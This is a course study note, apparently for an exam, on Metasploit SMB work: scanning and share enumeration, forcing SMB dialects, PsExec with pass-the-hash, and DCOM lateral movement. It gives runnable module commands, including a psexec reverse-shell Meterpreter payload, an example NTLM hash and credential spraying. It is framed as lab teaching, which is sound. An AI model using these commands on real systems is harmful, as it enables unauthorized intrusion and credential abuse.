---
tags: [jcu, module3, metasploit]
jqr: "Module 3 — SMB scanning (smb_version/enumshares/login), SMB::ProtocolVersion, PsExec + pass-the-hash, DCOM lateral movement"
---

# SMB PsExec and DCOM

SMB (ports 139/445) is the classic Windows/Samba attack surface. This note covers scanning it, forcing a specific SMB dialect, and — once you hold valid creds or a hash — running code on the target with PsExec or DCOM (lateral movement).

> 🧪 **Run this on your lab (Kali 2026.2)** — SMB modules only against your own Windows/Samba VMs. No live MSF output in the study sandbox; verified against current docs, confirm on your box.

## TL;DR

```text
use auxiliary/scanner/smb/smb_version      # fingerprint SMB1/2/3 + OS (no auth)
use auxiliary/scanner/smb/smb_enumshares   # list shares
use auxiliary/scanner/smb/smb_login        # validate a user+pass (or lists)
set RHOSTS 192.168.1.20 ; run

use exploit/windows/smb/psexec             # auth'd code exec via ADMIN$ (creds OR hash)
set SMBUser administrator ; set SMBPass <lab-pass-or-LM:NT>
set payload windows/x64/meterpreter/reverse_tcp ; set LHOST 192.168.1.10 ; run
```

## Concept

Two very different ways to abuse SMB:

- **Unauthenticated exploit** — a memory-corruption bug lets you in *without* creds. Canonical example: EternalBlue (`ms17_010_eternalblue`, CVE-2017-0144), an SMBv1 flaw. That's a way *in*. See [Common Software Vulnerabilities](../../Knowledge%20Req/Common%20Software%20Vulnerabilities.md).
- **Authenticated code execution** — you *already have* an admin password or NTLM hash, so you simply log in and run code. **PsExec** and **DCOM** are this. That's **lateral movement**, not initial access.

**Mental model — lock-picking vs the front-door key.** EternalBlue is lock-picking: you exploit a bug to get in with no key at all. PsExec and DCOM are the opposite — you *already hold the key* (an admin password or its hash), so you break nothing; you walk in the front door and drive Windows' own remote-admin plumbing (the `ADMIN$` share, the service manager, DCOM objects) to run your code. Nothing here is a "vulnerability" to patch — it's designed functionality being used by someone who shouldn't have the key. That's exactly why it counts as *lateral movement*, not initial access.

Knowing which is which is an exam trap: **PsExec/DCOM need creds; EternalBlue does not.**

## 1. Scan SMB (enumerate → version → login)

```text
# a) Version / OS fingerprint — auto-detects SMB1/2/3, no auth needed
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.20
run
```
→ Tells you the dialect and often the Windows build — your first SMB move.

```text
# b) Enumerate shares (anonymous often works; creds show more)
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.20
set SMBUser administrator ; set SMBPass Lab-Passw0rd!
run
```
→ Lists shares like `ADMIN$`, `C$`, `IPC$`, and any custom shares worth looting.

```text
# c) Credential check / spray a user+pass (or wordlists)
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.20
set SMBUser administrator ; set SMBPass Lab-Passw0rd!
run
```
→ Confirms creds work before you try to execute code. Use `USER_FILE` / `PASS_FILE` for lists (lab only).

## 2. Force an SMB dialect — `SMB::ProtocolVersion`

> [!important] The option is `SMB::ProtocolVersion` (an **advanced** option, 2026)
> Seen via `show advanced`. It selects which SMB **dialects** the client will negotiate. Value = one or a comma-separated list of `1` (SMBv1), `2` (SMBv2), `3` (SMBv3):
> ```text
> set SMB::ProtocolVersion 1        # force SMBv1 only
> set SMB::ProtocolVersion 2,3      # allow SMBv2 and SMBv3
> set SMB::ProtocolVersion 2,3,1    # order = negotiation preference
> ```
> - This replaced the older `SMBVersion` / "smb versions" style. On current Metasploit, **`SMB::ProtocolVersion` is correct**.
> - Gotcha: the **`smb_version` scanner deregisters this option** (it deliberately probes 1/2/3 itself). Set it on the *other* SMB modules — `smb_enumshares`, `smb_login`, `psexec`, the exploits — never on `smb_version`.

> **Why force a dialect at all:** some bugs live in one specific dialect — EternalBlue is SMBv1-only — but a modern target negotiates up to SMBv3 by default and may not speak v1 unless asked. Pinning the client's version list is how you hold the conversation on the dialect your module actually targets.

## 3. PsExec — authenticated code execution

```text
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.20
set SMBUser administrator
set SMBPass Lab-Passw0rd!
set SMBDomain .                       # . or WORKGROUP for a local account
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
run
```
→ On success: a SYSTEM-level [Meterpreter](Meterpreter.md) session.

**How it works (plain English):** authenticate to the target's `ADMIN$` share over SMB → drop/execute a payload as a **temporary, randomly-named Windows service** → the service runs your payload as SYSTEM → the module cleans up the service. It mirrors Sysinternals `PsExec.exe` — see [PsExec and Sysinternals](../../Win%20Admin/PsExec%20and%20Sysinternals.md).

### Pass-the-Hash (PtH)

You don't need the plaintext password — feed the NTLM hash in `SMBPass` using `LMHASH:NTHASH` format:

```text
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```
→ The LM half here is the standard "blank" value; auth succeeds without ever cracking the password. This is why hashes from `hashdump` are as good as passwords for lateral movement.

> **Why the hash is enough:** NTLM authentication proves you know the *hash*, not the plaintext — the password itself never travels on the wire. So a hash lifted from `hashdump` is a drop-in substitute, and there's nothing left to crack. That single fact is the whole mechanic behind the Pass-the-Hash technique.

**Related PsExec-family modules:**

| Module | Use |
|---|---|
| `exploit/windows/smb/psexec_psh` | PowerShell variant — no exe dropped to disk |
| `auxiliary/admin/smb/psexec_command` | run a **single command** with creds, **no session** (one-shot/recon) |
| `auxiliary/scanner/smb/psexec_loggedin_users` | psexec-style **scanner**: list logged-in users across a range |

## 4. DCOM — lateral movement over RPC

- **Classic exploit:** `exploit/windows/dcerpc/ms03_026_dcom` — the historic MS03-026 RPC/DCOM buffer overflow (legacy lab targets like unpatched XP/2000).
- **DCOM lateral movement** abuses DCOM objects (e.g. `MMC20.Application`, `ShellWindows`) to spawn processes on a remote host *with creds*. In practice this technique is more commonly run with Impacket's `dcomexec.py` or CrackMapExec than a core MSF module.

→ For the exam, hold the concept: DCOM lateral movement = **authenticated remote execution over DCOM/RPC**, an alternative to PsExec/WMI.

## Exam tips & gotchas

- **PsExec/DCOM need creds; EternalBlue does not.** Classify the module before you reach for it.
- **PtH uses `LMHASH:NTHASH` in `SMBPass`** — the `LM:NT` colon format, not just the NT half alone.
- **`SMB::ProtocolVersion`** is the modern option name (values `1`/`2`/`3`, comma-separated) and is **not settable on `smb_version`**.
- **`SMBDomain .` (or `WORKGROUP`)** for local accounts; use the real domain for domain accounts.
- **Standard SMB order:** `smb_version` → `smb_enumshares` → `smb_login` → then psexec. Don't burn a login attempt lockout by spraying blindly.
- **PsExec drops a temporary service** — it's noisy in Windows event logs (service install 7045); fine in a lab, loud in the real world.

## References

- Metasploit SMB pentesting guide — https://docs.metasploit.com/docs/pentesting/metasploit-guide-smb.html
- `smb_version` module source (deregisters `SMB::ProtocolVersion`) — https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_version.rb
- Guidelines for writing SMB modules (`SMB::ProtocolVersion` values) — https://adfoster-r7.github.io/metasploit-framework/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html
- PsExec module (Rapid7 DB) — https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/
- EternalBlue module (Rapid7 DB) — https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
- MITRE ATT&CK — Pass the Hash (T1550.002) — https://attack.mitre.org/techniques/T1550/002/
- MITRE ATT&CK — Remote Services: DCOM (T1021.003) — https://attack.mitre.org/techniques/T1021/003/

## Related

- [Metasploit Workflow](Metasploit%20Workflow.md)
- [Meterpreter](Meterpreter.md)
- [PsExec and Sysinternals](../../Win%20Admin/PsExec%20and%20Sysinternals.md)
- [Windows CLI and net Commands](../../Win%20Admin/Windows%20CLI%20and%20net%20Commands.md)
- [Common Software Vulnerabilities](../../Knowledge%20Req/Common%20Software%20Vulnerabilities.md)
